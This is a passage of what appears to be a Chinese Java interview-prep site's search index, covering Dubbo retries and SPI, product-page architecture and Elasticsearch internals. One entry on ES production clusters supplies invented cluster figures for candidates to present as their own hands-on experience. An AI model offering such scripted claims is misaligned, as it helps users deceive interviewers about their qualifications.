sayHello() { // 降级逻辑  } } 失败重试和超时重试    所谓失败重试，就是 consumer 调用 provider 要是失败了，比如抛异常了，此时应该是可以重试的，或者调用超时了也可以重试。配置如下：\n\u0026lt;dubbo:reference id=\u0026#34;xxxx\u0026#34; interface=\u0026#34;xx\u0026#34; check=\u0026#34;true\u0026#34; async=\u0026#34;false\u0026#34; retries=\u0026#34;3\u0026#34; timeout=\u0026#34;2000\u0026#34;/\u0026gt; 举个栗子。\n某个服务的接口，要耗费 5s，你这边不能干等着，你这边配置了 timeout 之后，我等待 2s，还没返回，我直接就撤了，不能干等你。\n可以结合你们公司具体的场景来说说你是怎么设置这些参数的：\n timeout ：一般设置为 200ms ，我们认为不能超过 200ms 还没返回。 retries ：设置 retries，一般是在读请求的时候，比如你要查询个数据，你可以设置个 retries，如果第一次没读到，报错，重试指定的次数，尝试再次读取。  "},{"id":164,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/dubbo-spi/","title":"dubbo-spi","parent":"分布式系统","content":"面试题    dubbo 的 spi 思想是什么？\n面试官心理分析    继续深入问呗，前面一些基础性的东西问完了，确定你应该都 ok，了解 dubbo 的一些基本东西，那么问个稍微难一点点的问题，就是 spi，先问问你 spi 是啥？然后问问你 dubbo 的 spi 是怎么实现的？\n其实就是看看你对 dubbo 的掌握如何。\n面试题剖析    spi 是啥？    spi，简单来说，就是 service provider interface ，说白了是什么意思呢，比如你有个接口，现在这个接口有 3 个实现类，那么在系统运行的时候对这个接口到底选择哪个实现类呢？这就需要 spi 了，需要根据指定的配置或者是默认的配置，去找到对应的实现类加载进来，然后用这个实现类的实例对象。\n举个栗子。\n你有一个接口 A。A1/A2/A3 分别是接口 A 的不同实现。你通过配置 接口 A = 实现 A2 ，那么在系统实际运行的时候，会加载你的配置，用实现 A2 实例化一个对象来提供服务。\nspi 机制一般用在哪儿？插件扩展的场景，比如说你开发了一个给别人使用的开源框架，如果你想让别人自己写个插件，插到你的开源框架里面，从而扩展某个功能，这个时候 spi 思想就用上了。\nJava spi 思想的体现    spi 经典的思想体现，大家平时都在用，比如说 jdbc。\nJava 定义了一套 jdbc 的接口，但是 Java 并没有提供 jdbc 的实现类。\n但是实际上项目跑的时候，要使用 jdbc 接口的哪些实现类呢？一般来说，我们要根据自己使用的数据库，比如 mysql，你就将 mysql-jdbc-connector.jar 引入进来；oracle，你就将 oracle-jdbc-connector.jar 引入进来。\n在系统跑的时候，碰到你使用 jdbc 的接口，他会在底层使用你引入的那个 jar 中提供的实现类。\ndubbo 的 spi 思想    dubbo 也用了 spi 思想，不过没有用 jdk 的 spi 机制，是自己实现的一套 spi 机制。\nProtocol protocol = ExtensionLoader.getExtensionLoader(Protocol.class).getAdaptiveExtension(); Protocol 接口，在系统运行的时候，，dubbo 会判断一下应该选用这个 Protocol 接口的哪个实现类来实例化对象来使用。\n它会去找一个你配置的 Protocol，将你配置的 Protocol 实现类，加载到 jvm 中来，然后实例化对象，就用你的那个 Protocol 实现类就可以了。\n上面那行代码就是 dubbo 里大量使用的，就是对很多组件，都是保留一个接口和多个实现，然后在系统运行的时候动态根据配置去找到对应的实现类。如果你没配置，那就走默认的实现好了，没问题。\n@SPI(\u0026#34;dubbo\u0026#34;) public interface Protocol { int getDefaultPort(); @Adaptive \u0026lt;T\u0026gt; Exporter\u0026lt;T\u0026gt; export(Invoker\u0026lt;T\u0026gt; invoker) throws RpcException; @Adaptive \u0026lt;T\u0026gt; Invoker\u0026lt;T\u0026gt; refer(Class\u0026lt;T\u0026gt; type, URL url) throws RpcException; void destroy(); } 在 dubbo 自己的 jar 里，在 /META_INF/dubbo/internal/com.alibaba.dubbo.rpc.Protocol 文件中：\ndubbo=com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol http=com.alibaba.dubbo.rpc.protocol.http.HttpProtocol hessian=com.alibaba.dubbo.rpc.protocol.hessian.HessianProtocol 所以说，这就看到了 dubbo 的 spi 机制默认是怎么玩儿的了，其实就是 Protocol 接口， @SPI(\u0026quot;dubbo\u0026quot;) 说的是，通过 SPI 机制来提供实现类，实现类是通过 dubbo 作为默认 key 去配置文件里找到的，配置文件名称与接口全限定名一样的，通过 dubbo 作为 key 可以找到默认的实现类就是 com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol 。\n如果想要动态替换掉默认的实现类，需要使用 @Adaptive 接口，Protocol 接口中，有两个方法加了 @Adaptive 注解，就是说那俩接口会被代理实现。\n啥意思呢？\n比如这个 Protocol 接口搞了俩 @Adaptive 注解标注了方法，在运行的时候会针对 Protocol 生成代理类，这个代理类的那俩方法里面会有代理代码，代理代码会在运行的时候动态根据 url 中的 protocol 来获取那个 key，默认是 dubbo，你也可以自己指定，你如果指定了别的 key，那么就会获取别的实现类的实例了。\n如何自己扩展 dubbo 中的组件    下面来说说怎么来自己扩展 dubbo 中的组件。\n自己写个工程，要是那种可以打成 jar 包的，里面的 src/main/resources 目录下，搞一个 META-INF/services ，里面放个文件叫： com.alibaba.dubbo.rpc.Protocol ，文件里搞一个 my=com.bingo.MyProtocol 。自己把 jar 弄到 nexus 私服里去。\n然后自己搞一个 dubbo provider 工程，在这个工程里面依赖你自己搞的那个 jar，然后在 spring 配置文件里给个配置：\n\u0026lt;dubbo:protocol name=”my” port=”20000” /\u0026gt; provider 启动的时候，就会加载到我们 jar 包里的 my=com.bingo.MyProtocol 这行配置里，接着会根据你的配置使用你定义好的 MyProtocol 了，这个就是简单说明一下，你通过上述方式，可以替换掉大量的 dubbo 内部的组件，就是扔个你自己的 jar 包，然后配置一下即可。\ndubbo 里面提供了大量的类似上面的扩展点，就是说，你如果要扩展一个东西，只要自己写个 jar，让你的 consumer 或者是 provider 工程，依赖你的那个 jar，在你的 jar 里指定目录下配置好接口名称对应的文件，里面通过 key=实现类 。\n然后对于对应的组件，类似 \u0026lt;dubbo:protocol\u0026gt; 用你的那个 key 对应的实现类来实现某个接口，你可以自己去扩展 dubbo 的各种功能，提供你自己的实现。\n"},{"id":165,"href":"/%E9%AB%98%E5%8F%AF%E7%94%A8/e-commerce-website-detail-page-architecture/","title":"e-commerce-website-detail-page-architecture","parent":"高可用","content":"电商网站的商品详情页系统架构    小型电商网站的商品详情页系统架构    小型电商网站的页面展示采用页面全量静态化的思想。数据库中存放了所有的商品信息，页面静态化系统，将数据填充进静态模板中，形成静态化页面，推入 Nginx 服务器。用户浏览网站页面时，取用一个已经静态化好的 html 页面，直接返回回去，不涉及任何的业务逻辑处理。\n下面是页面模板的简单 Demo 。\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; 商品名称：#{productName}\u0026lt;br /\u0026gt; 商品价格：#{productPrice}\u0026lt;br /\u0026gt; 商品描述：#{productDesc} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这样做，好处在于，用户每次浏览一个页面，不需要进行任何的跟数据库的交互逻辑，也不需要执行任何的代码，直接返回一个 html 页面就可以了，速度和性能非常高。\n对于小网站，页面很少，很实用，非常简单，Java 中可以使用 velocity、freemarker、thymeleaf 等等，然后做个 cms 页面内容管理系统，模板变更的时候，点击按钮或者系统自动化重新进行全量渲染。\n坏处在于，仅仅适用于一些小型的网站，比如页面的规模在几十到几万不等。对于一些大型的电商网站，亿级数量的页面，你说你每次页面模板修改了，都需要将这么多页面全量静态化，靠谱吗？每次渲染花个好几天时间，那你整个网站就废掉了。\n大型电商网站的商品详情页系统架构    大型电商网站商品详情页的系统设计中，当商品数据发生变更时，会将变更消息压入 MQ 消息队列中。缓存服务从消息队列中消费这条消息时，感知到有数据发生变更，便通过调用数据服务接口，获取变更后的数据，然后将整合好的数据推送至 redis 中。Nginx 本地缓存的数据是有一定的时间期限的，比如说 10 分钟，当数据过期之后，它就会从 redis 获取到最新的缓存数据，并且缓存到自己本地。\n用户浏览网页时，动态将 Nginx 本地数据渲染到本地 html 模板并返回给用户。\n虽然没有直接返回 html 页面那么快，但是因为数据在本地缓存，所以也很快，其实耗费的也就是动态渲染一个 html 页面的性能。如果 html 模板发生了变更，不需要将所有的页面重新静态化，也不需要发送请求，没有网络请求的开销，直接将数据渲染进最新的 html 页面模板后响应即可。\n在这种架构下，我们需要保证系统的高可用性。\n如果系统访问量很高，Nginx 本地缓存过期失效了，redis 中的缓存也被 LRU 算法给清理掉了，那么会有较高的访问量，从缓存服务调用商品服务。但如果此时商品服务的接口发生故障，调用出现了延时，缓存服务全部的线程都被这个调用商品服务接口给耗尽了，每个线程去调用商品服务接口的时候，都会卡住很长时间，后面大量的请求过来都会卡在那儿，此时缓存服务没有足够的线程去调用其它一些服务的接口，从而导致整个大量的商品详情页无法正常显示。\n这其实就是一个商品接口服务故障导致缓存服务资源耗尽的现象。\n"},{"id":166,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/es-architecture/","title":"es-architecture","parent":"高并发","content":"面试题    ES 的分布式架构原理能说一下么（ES 是如何实现分布式的啊）？\n面试官心理分析    在搜索这块，lucene 是最流行的搜索库。几年前业内一般都问，你了解 lucene 吗？你知道倒排索引的原理吗？现在早已经 out 了，因为现在很多项目都是直接用基于 lucene 的分布式搜索引擎—— ElasticSearch，简称为 ES。\n而现在分布式搜索基本已经成为大部分互联网行业的 Java 系统的标配，其中尤为流行的就是 ES，前几年 ES 没火的时候，大家一般用 solr。但是这两年基本大部分企业和项目都开始转向 ES 了。\n所以互联网面试，肯定会跟你聊聊分布式搜索引擎，也就一定会聊聊 ES，如果你确实不知道，那你真的就 out 了。\n如果面试官问你第一个问题，确实一般都会问你 ES 的分布式架构设计能介绍一下么？就看看你对分布式搜索引擎架构的一个基本理解。\n面试题剖析    ElasticSearch 设计的理念就是分布式搜索引擎，底层其实还是基于 lucene 的。核心思想就是在多台机器上启动多个 ES 进程实例，组成了一个 ES 集群。\nES 中存储数据的基本单位是索引，比如说你现在要在 ES 中存储一些订单数据，你就应该在 ES 中创建一个索引 order_idx ，所有的订单数据就都写到这个索引里面去，一个索引差不多就是相当于是 mysql 里的一张表。\nindex -\u0026gt; type -\u0026gt; mapping -\u0026gt; document -\u0026gt; field。 这样吧，为了做个更直白的介绍，我在这里做个类比。但是切记，不要划等号，类比只是为了便于理解。\nindex 相当于 mysql 里的一张表。而 type 没法跟 mysql 里去对比，一个 index 里可以有多个 type，每个 type 的字段都是差不多的，但是有一些略微的差别。假设有一个 index，是订单 index，里面专门是放订单数据的。就好比说你在 mysql 中建表，有些订单是实物商品的订单，比如一件衣服、一双鞋子；有些订单是虚拟商品的订单，比如游戏点卡，话费充值。就两种订单大部分字段是一样的，但是少部分字段可能有略微的一些差别。\n所以就会在订单 index 里，建两个 type，一个是实物商品订单 type，一个是虚拟商品订单 type，这两个 type 大部分字段是一样的，少部分字段是不一样的。\n很多情况下，一个 index 里可能就一个 type，但是确实如果说是一个 index 里有多个 type 的情况（注意， mapping types 这个概念在 ElasticSearch 7. X 已被完全移除，详细说明可以参考官方文档），你可以认为 index 是一个类别的表，具体的每个 type 代表了 mysql 中的一个表。每个 type 有一个 mapping，如果你认为一个 type 是具体的一个表，index 就代表多个 type 同属于的一个类型，而 mapping 就是这个 type 的表结构定义，你在 mysql 中创建一个表，肯定是要定义表结构的，里面有哪些字段，每个字段是什么类型。实际上你往 index 里的一个 type 里面写的一条数据，叫做一条 document，一条 document 就代表了 mysql 中某个表里的一行，每个 document 有多个 field，每个 field 就代表了这个 document 中的一个字段的值。\n你搞一个索引，这个索引可以拆分成多个 shard ，每个 shard 存储部分数据。拆分多个 shard 是有好处的，一是支持横向扩展，比如你数据量是 3T，3 个 shard，每个 shard 就 1T 的数据，若现在数据量增加到 4T，怎么扩展，很简单，重新建一个有 4 个 shard 的索引，将数据导进去；二是提高性能，数据分布在多个 shard，即多台服务器上，所有的操作，都会在多台机器上并行分布式执行，提高了吞吐量和性能。\n接着就是这个 shard 的数据实际是有多个备份，就是说每个 shard 都有一个 primary shard ，负责写入数据，但是还有几个 replica shard 。 primary shard 写入数据之后，会将数据同步到其他几个 replica shard 上去。\n通过这个 replica 的方案，每个 shard 的数据都有多个备份，如果某个机器宕机了，没关系啊，还有别的数据副本在别的机器上呢。高可用了吧。\nES 集群多个节点，会自动选举一个节点为 master 节点，这个 master 节点其实就是干一些管理的工作的，比如维护索引元数据、负责切换 primary shard 和 replica shard 身份等。要是 master 节点宕机了，那么会重新选举一个节点为 master 节点。\n如果是非 master 节点宕机了，那么会由 master 节点，让那个宕机节点上的 primary shard 的身份转移到其他机器上的 replica shard。接着你要是修复了那个宕机机器，重启了之后，master 节点会控制将缺失的 replica shard 分配过去，同步后续修改的数据之类的，让集群恢复正常。\n说得更简单一点，就是说如果某个非 master 节点宕机了。那么此节点上的 primary shard 不就没了。那好，master 会让 primary shard 对应的 replica shard（在其他机器上）切换为 primary shard。如果宕机的机器修复了，修复后的节点也不再是 primary shard，而是 replica shard。\n其实上述就是 ElasticSearch 作为分布式搜索引擎最基本的一个架构设计。\n"},{"id":167,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/es-introduction/","title":"es-introduction","parent":"高并发","content":"Lucene 和 ES 的前世今生    Lucene 是最先进、功能最强大的搜索库。如果直接基于 Lucene 开发，非常复杂，即便写一些简单的功能，也要写大量的 Java 代码，需要深入理解原理。\nElasticSearch 基于 Lucene，隐藏了 lucene 的复杂性，提供了简单易用的 RESTful api / Java api 接口（另外还有其他语言的 api 接口）。\n 分布式的文档存储引擎 分布式的搜索引擎和分析引擎 分布式，支持 PB 级数据  ES 的核心概念    Near Realtime    近实时，有两层意思：\n 从写入数据到数据可以被搜索到有一个小延迟（大概是 1s） 基于 ES 执行搜索和分析可以达到秒级  Cluster 集群    集群包含多个节点，每个节点属于哪个集群都是通过一个配置来决定的，对于中小型应用来说，刚开始一个集群就一个节点很正常。\nNode 节点    Node 是集群中的一个节点，节点也有一个名称，默认是随机分配的。默认节点会去加入一个名称为 elasticsearch 的集群。如果直接启动一堆节点，那么它们会自动组成一个 elasticsearch 集群，当然一个节点也可以组成 elasticsearch 集群。\nDocument \u0026amp; field    文档是 ES 中最小的数据单元，一个 document 可以是一条客户数据、一条商品分类数据、一条订单数据，通常用 json 数据结构来表示。每个 index 下的 type，都可以存储多条 document。一个 document 里面有多个 field，每个 field 就是一个数据字段。\n{ \u0026#34;product_id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;product_name\u0026#34;: \u0026#34;iPhone X\u0026#34;, \u0026#34;product_desc\u0026#34;: \u0026#34;苹果手机\u0026#34;, \u0026#34;category_id\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;category_name\u0026#34;: \u0026#34;电子产品\u0026#34; } Index    索引包含了一堆有相似结构的文档数据，比如商品索引。一个索引包含很多 document，一个索引就代表了一类相似或者相同的 ducument。\nType    类型，每个索引里可以有一个或者多个 type，type 是 index 的一个逻辑分类，比如商品 index 下有多个 type：日化商品 type、电器商品 type、生鲜商品 type。每个 type 下的 document 的 field 可能不太一样。\nshard    单台机器无法存储大量数据，ES 可以将一个索引中的数据切分为多个 shard，分布在多台服务器上存储。有了 shard 就可以横向扩展，存储更多数据，让搜索和分析等操作分布到多台服务器上去执行，提升吞吐量和性能。每个 shard 都是一个 lucene index。\nreplica    任何一个服务器随时可能故障或宕机，此时 shard 可能就会丢失，因此可以为每个 shard 创建多个 replica 副本。replica 可以在 shard 故障时提供备用服务，保证数据不丢失，多个 replica 还可以提升搜索操作的吞吐量和性能。primary shard（建立索引时一次设置，不能修改，默认 5 个），replica shard（随时修改数量，默认 1 个），默认每个索引 10 个 shard，5 个 primary shard，5 个 replica shard，最小的高可用配置，是 2 台服务器。\n这么说吧，shard 分为 primary shard 和 replica shard。而 primary shard 一般简称为 shard，而 replica shard 一般简称为 replica。\nES 核心概念 vs. DB 核心概念       ES DB     index 数据库   type 数据表   document 一行数据    以上是一个简单的类比。\n"},{"id":168,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/es-optimizing-query-performance/","title":"es-optimizing-query-performance","parent":"高并发","content":"面试题    ES 在数据量很大的情况下（数十亿级别）如何提高查询效率啊？\n面试官心理分析    这个问题是肯定要问的，说白了，就是看你有没有实际干过 es，因为啥？其实 es 性能并没有你想象中那么好的。很多时候数据量大了，特别是有几亿条数据的时候，可能你会懵逼的发现，跑个搜索怎么一下 5~10s ，坑爹了。第一次搜索的时候，是 5~10s ，后面反而就快了，可能就几百毫秒。\n你就很懵，每个用户第一次访问都会比较慢，比较卡么？所以你要是没玩儿过 es，或者就是自己玩玩儿 demo，被问到这个问题容易懵逼，显示出你对 es 确实玩儿的不怎么样？\n面试题剖析    说实话，es 性能优化是没有什么银弹的，啥意思呢？就是不要期待着随手调一个参数，就可以万能的应对所有的性能慢的场景。也许有的场景是你换个参数，或者调整一下语法，就可以搞定，但是绝对不是所有场景都可以这样。\n性能优化的杀手锏——filesystem cache    你往 es 里写的数据，实际上都写到磁盘文件里去了，查询的时候，操作系统会将磁盘文件里的数据自动缓存到 filesystem cache 里面去。\nes 的搜索引擎严重依赖于底层的 filesystem cache ，你如果给 filesystem cache 更多的内存，尽量让内存可以容纳所有的 idx segment file  索引数据文件，那么你搜索的时候就基本都是走内存的，性能会非常高。\n性能差距究竟可以有多大？我们之前很多的测试和压测，如果走磁盘一般肯定上秒，搜索性能绝对是秒级别的，1 秒、5 秒、10 秒。但如果是走 filesystem cache ，是走纯内存的，那么一般来说性能比走磁盘要高一个数量级，基本上就是毫秒级的，从几毫秒到几百毫秒不等。\n这里有个真实的案例。某个公司 es 节点有 3 台机器，每台机器看起来内存很多，64G，总内存就是 64 * 3 = 192G 。每台机器给 es jvm heap 是 32G ，那么剩下来留给 filesystem cache 的就是每台机器才 32G ，总共集群里给 filesystem cache 的就是 32 * 3 = 96G 内存。而此时，整个磁盘上索引数据文件，在 3 台机器上一共占用了 1T 的磁盘容量，es 数据量是 1T ，那么每台机器的数据量是 300G 。这样性能好吗？ filesystem cache 的内存才 100G，十分之一的数据可以放内存，其他的都在磁盘，然后你执行搜索操作，大部分操作都是走磁盘，性能肯定差。\n归根结底，你要让 es 性能要好，最佳的情况下，就是你的机器的内存，至少可以容纳你的总数据量的一半。\n根据我们自己的生产环境实践经验，最佳的情况下，是仅仅在 es 中就存少量的数据，就是你要用来搜索的那些索引，如果内存留给 filesystem cache 的是 100G，那么你就将索引数据控制在 100G 以内，这样的话，你的数据几乎全部走内存来搜索，性能非常之高，一般可以在 1 秒以内。\n比如说你现在有一行数据。 id,name,age .... 30 个字段。但是你现在搜索，只需要根据 id,name,age 三个字段来搜索。如果你傻乎乎往 es 里写入一行数据所有的字段，就会导致说 90% 的数据是不用来搜索的，结果硬是占据了 es 机器上的 filesystem cache 的空间，单条数据的数据量越大，就会导致 filesystem cahce 能缓存的数据就越少。其实，仅仅写入 es 中要用来检索的少数几个字段就可以了，比如说就写入 es id,name,age 三个字段，然后你可以把其他的字段数据存在 mysql/hbase 里，我们一般是建议用 es + hbase 这么一个架构。\nhbase 的特点是适用于海量数据的在线存储，就是对 hbase 可以写入海量数据，但是不要做复杂的搜索，做很简单的一些根据 id 或者范围进行查询的这么一个操作就可以了。从 es 中根据 name 和 age 去搜索，拿到的结果可能就 20 个 doc id ，然后根据 doc id 到 hbase 里去查询每个 doc id 对应的完整的数据，给查出来，再返回给前端。\n写入 es 的数据最好小于等于，或者是略微大于 es 的 filesystem cache 的内存容量。然后你从 es 检索可能就花费 20ms，然后再根据 es 返回的 id 去 hbase 里查询，查 20 条数据，可能也就耗费个 30ms，可能你原来那么玩儿，1T 数据都放 es，会每次查询都是 5~10s，现在可能性能就会很高，每次查询就是 50ms。\n数据预热    假如说，哪怕是你就按照上述的方案去做了，es 集群中每个机器写入的数据量还是超过了 filesystem cache 一倍，比如说你写入一台机器 60G 数据，结果 filesystem cache 就 30G，还是有 30G 数据留在了磁盘上。\n其实可以做数据预热。\n举个例子，拿微博来说，你可以把一些大 V，平时看的人很多的数据，你自己提前后台搞个系统，每隔一会儿，自己的后台系统去搜索一下热数据，刷到 filesystem cache 里去，后面用户实际上来看这个热数据的时候，他们就是直接从内存里搜索了，很快。\n或者是电商，你可以将平时查看最多的一些商品，比如说 iphone 8，热数据提前后台搞个程序，每隔 1 分钟自己主动访问一次，刷到 filesystem cache 里去。\n对于那些你觉得比较热的、经常会有人访问的数据，最好做一个专门的缓存预热子系统，就是对热数据每隔一段时间，就提前访问一下，让数据进入 filesystem cache 里面去。这样下次别人访问的时候，性能一定会好很多。\n冷热分离    es 可以做类似于 mysql 的水平拆分，就是说将大量的访问很少、频率很低的数据，单独写一个索引，然后将访问很频繁的热数据单独写一个索引。最好是将冷数据写入一个索引中，然后热数据写入另外一个索引中，这样可以确保热数据在被预热之后，尽量都让他们留在 filesystem os cache 里，别让冷数据给冲刷掉。\n你看，假设你有 6 台机器，2 个索引，一个放冷数据，一个放热数据，每个索引 3 个 shard。3 台机器放热数据 index，另外 3 台机器放冷数据 index。然后这样的话，你大量的时间是在访问热数据 index，热数据可能就占总数据量的 10%，此时数据量很少，几乎全都保留在 filesystem cache 里面了，就可以确保热数据的访问性能是很高的。但是对于冷数据而言，是在别的 index 里的，跟热数据 index 不在相同的机器上，大家互相之间都没什么联系了。如果有人访问冷数据，可能大量数据是在磁盘上的，此时性能差点，就 10% 的人去访问冷数据，90% 的人在访问热数据，也无所谓了。\ndocument 模型设计    对于 MySQL，我们经常有一些复杂的关联查询。在 es 里该怎么玩儿，es 里面的复杂的关联查询尽量别用，一旦用了性能一般都不太好。\n最好是先在 Java 系统里就完成关联，将关联好的数据直接写入 es 中。搜索的时候，就不需要利用 es 的搜索语法来完成 join 之类的关联搜索了。\ndocument 模型设计是非常重要的，很多操作，不要在搜索的时候才想去执行各种复杂的乱七八糟的操作。es 能支持的操作就那么多，不要考虑用 es 做一些它不好操作的事情。如果真的有那种操作，尽量在 document 模型设计的时候，写入的时候就完成。另外对于一些太复杂的操作，比如 join/nested/parent-child 搜索都要尽量避免，性能都很差的。\n分页性能优化    es 的分页是较坑的，为啥呢？举个例子吧，假如你每页是 10 条数据，你现在要查询第 100 页，实际上是会把每个 shard 上存储的前 1000 条数据都查到一个协调节点上，如果你有个 5 个 shard，那么就有 5000 条数据，接着协调节点对这 5000 条数据进行一些合并、处理，再获取到最终第 100 页的 10 条数据。\n分布式的，你要查第 100 页的 10 条数据，不可能说从 5 个 shard，每个 shard 就查 2 条数据，最后到协调节点合并成 10 条数据吧？你必须得从每个 shard 都查 1000 条数据过来，然后根据你的需求进行排序、筛选等等操作，最后再次分页，拿到里面第 100 页的数据。你翻页的时候，翻的越深，每个 shard 返回的数据就越多，而且协调节点处理的时间越长，非常坑爹。所以用 es 做分页的时候，你会发现越翻到后面，就越是慢。\n我们之前也是遇到过这个问题，用 es 作分页，前几页就几十毫秒，翻到 10 页或者几十页的时候，基本上就要 5~10 秒才能查出来一页数据了。\n有什么解决方案吗？\n不允许深度分页（默认深度分页性能很差）    跟产品经理说，你系统不允许翻那么深的页，默认翻的越深，性能就越差。\n类似于 app 里的推荐商品不断下拉出来一页一页的    类似于微博中，下拉刷微博，刷出来一页一页的，你可以用 scroll api ，关于如何使用，自行上网搜索。\nscroll 会一次性给你生成所有数据的一个快照，然后每次滑动向后翻页就是通过游标 scroll_id 移动，获取下一页下一页这样子，性能会比上面说的那种分页性能要高很多很多，基本上都是毫秒级的。\n但是，唯一的一点就是，这个适合于那种类似微博下拉翻页的，不能随意跳到任何一页的场景。也就是说，你不能先进入第 10 页，然后去第 120 页，然后又回到第 58 页，不能随意乱跳页。所以现在很多产品，都是不允许你随意翻页的，app，也有一些网站，做的就是你只能往下拉，一页一页的翻。\n初始化时必须指定 scroll 参数，告诉 es 要保存此次搜索的上下文多长时间。你需要确保用户不会持续不断翻页翻几个小时，否则可能因为超时而失败。\n除了用 scroll api ，你也可以用 search_after 来做， search_after 的思想是使用前一页的结果来帮助检索下一页的数据，显然，这种方式也不允许你随意翻页，你只能一页页往后翻。初始化时，需要使用一个唯一值的字段作为 sort 字段。\n"},{"id":169,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/es-production-cluster/","title":"es-production-cluster","parent":"高并发","content":"面试题    ES 生产集群的部署架构是什么？每个索引的数据量大概有多少？每个索引大概有多少个分片？\n面试官心理分析    这个问题，包括后面的 redis 什么的，谈到 es、redis、mysql 分库分表等等技术，面试必问！就是你生产环境咋部署的？说白了，这个问题没啥技术含量，就是看你有没有在真正的生产环境里干过这事儿！\n有些同学可能是没在生产环境中干过的，没实际去拿线上机器部署过 es 集群，也没实际玩儿过，也没往 es 集群里面导入过几千万甚至是几亿的数据量，可能你就不太清楚这里面的一些生产项目中的细节。\n如果你是自己就玩儿过 demo，没碰过真实的 es 集群，那你可能此时会懵。别懵，你一定要云淡风轻的回答出来这个问题，表示你确实干过这事儿。\n面试题剖析    其实这个问题没啥，如果你确实干过 es，那你肯定了解你们生产 es 集群的实际情况，部署了几台机器？有多少个索引？每个索引有多大数据量？每个索引给了多少个分片？你肯定知道！\n但是如果你确实没干过，也别虚，我给你说一个基本的版本，你到时候就简单说一下就好了。\n es 生产集群我们部署了 5 台机器，每台机器是 6 核 64G 的，集群总内存是 320G。 我们 es 集群的日增量数据大概是 2000 万条，每天日增量数据大概是 500MB，每月增量数据大概是 6 亿，15G。目前系统已经运行了几个月，现在 es 集群里数据总量大概是 100G 左右。 目前线上有 5 个索引（这个结合你们自己业务来，看看自己有哪些数据可以放 es 的），每个索引的数据量大概是 20G，所以这个数据量之内，我们每个索引分配的是 8 个 shard，比默认的 5 个 shard 多了 3 个 shard。  大概就这么说一下就行了。\n"},{"id":170,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/es-write-query-search/","title":"es-write-query-search","parent":"高并发","content":"面试题    ES 写入数据的工作原理是什么啊？ES 查询数据的工作原理是什么啊？底层的 Lucene 介绍一下呗？倒排索引了解吗？\n面试官心理分析    问这个，其实面试官就是要看看你了解不了解 es 的一些基本原理，因为用 es 无非就是写入数据，搜索数据。你要是不明白你发起一个写入和搜索请求的时候，es 在干什么，那你真的是\u0026hellip;\u0026hellip;\n对 es 基本就是个黑盒，你还能干啥？你唯一能干的就是用 es 的 api 读写数据了。要是出点什么问题，你啥都不知道，那还能指望你什么呢？\n面试题剖析    es 写数据过程     客户端选择一个 node 发送请求过去，这个 node 就是 coordinating node （协调节点）。 coordinating node 对 document 进行路由，将请求转发给对应的 node（有 primary shard）。 实际的 node 上的 primary shard 处理请求，然后将数据同步到 replica node 。 coordinating node 如果发现 primary node 和所有 replica node 都搞定之后，就返回响应结果给客户端。  es 读数据过程    可以通过 doc id 来查询，会根据 doc id 进行 hash，判断出来当时把 doc id 分配到了哪个 shard 上面去，从那个 shard 去查询。\n 客户端发送请求到任意一个 node，成为 coordinate node 。 coordinate node 对 doc id 进行哈希路由，将请求转发到对应的 node，此时会使用 round-robin 随机轮询算法，在 primary shard 以及其所有 replica 中随机选择一个，让读请求负载均衡。 接收请求的 node 返回 document 给 coordinate node 。 coordinate node 返回 document 给客户端。  es 搜索数据过程    es 最强大的是做全文检索，就是比如你有三条数据：\njava真好玩儿啊 java好难学啊 j2ee特别牛 你根据 java 关键词来搜索，将包含 java 的 document 给搜索出来。es 就会给你返回：java 真好玩儿啊，java 好难学啊。\n 客户端发送请求到一个 coordinate node 。 协调节点将搜索请求转发到所有的 shard 对应的 primary shard 或 replica shard ，都可以。 query phase：每个 shard 将自己的搜索结果（其实就是一些 doc id ）返回给协调节点，由协调节点进行数据的合并、排序、分页等操作，产出最终结果。 fetch phase：接着由协调节点根据 doc id 去各个节点上拉取实际的 document 数据，最终返回给客户端。   写请求是写入 primary shard，然后同步给所有的 replica shard；读请求可以从 primary shard 或 replica shard 读取，采用的是随机轮询算法。\n 写数据底层原理    先写入内存 buffer，在 buffer 里的时候数据是搜索不到的；同时将数据写入 translog 日志文件。\n如果 buffer 快满了，或者到一定时间，就会将内存 buffer 数据 refresh 到一个新的 segment file 中，但是此时数据不是直接进入 segment file 磁盘文件，而是先进入 os cache 。这个过程就是 refresh 。\n每隔 1 秒钟，es 将 buffer 中的数据写入一个新的 segment file ，每秒钟会产生一个新的磁盘文件 segment file ，这个 segment file 中就存储最近 1 秒内 buffer 中写入的数据。\n但是如果 buffer 里面此时没有数据，那当然不会执行 refresh 操作，如果 buffer 里面有数据，默认 1 秒钟执行一次 refresh 操作，刷入一个新的 segment file 中。\n操作系统里面，磁盘文件其实都有一个东西，叫做 os cache ，即操作系统缓存，就是说数据写入磁盘文件之前，会先进入 os cache ，先进入操作系统级别的一个内存缓存中去。只要 buffer 中的数据被 refresh 操作刷入 os cache 中，这个数据就可以被搜索到了。\n为什么叫 es 是准实时的？ NRT ，全称 near real-time 。默认是每隔 1 秒 refresh 一次的，所以 es 是准实时的，因为写入的数据 1 秒之后才能被看到。可以通过 es 的 restful api 或者 java api ，手动执行一次 refresh 操作，就是手动将 buffer 中的数据刷入 os cache 中，让数据立马就可以被搜索到。只要数据被输入 os cache 中，buffer 就会被清空了，因为不需要保留 buffer 了，数据在 translog 里面已经持久化到磁盘去一份了。\n重复上面的步骤，新的数据不断进入 buffer 和 translog，不断将 buffer 数据写入一个又一个新的 segment file 中去，每次 refresh 完 buffer 清空，translog 保留。随着这个过程推进，translog 会变得越来越大。当 translog 达到一定长度的时候，就会触发 commit 操作。\ncommit 操作发生第一步，就是将 buffer 中现有数据 refresh 到 os cache 中去，清空 buffer。然后，将一个 commit point 写入磁盘文件，里面标识着这个 commit point 对应的所有 segment file ，同时强行将 os cache 中目前所有的数据都 fsync 到磁盘文件中去。最后清空 现有 translog 日志文件，重启一个 translog，此时 commit 操作完成。\n这个 commit 操作叫做 flush 。默认 30 分钟自动执行一次 flush ，但如果 translog 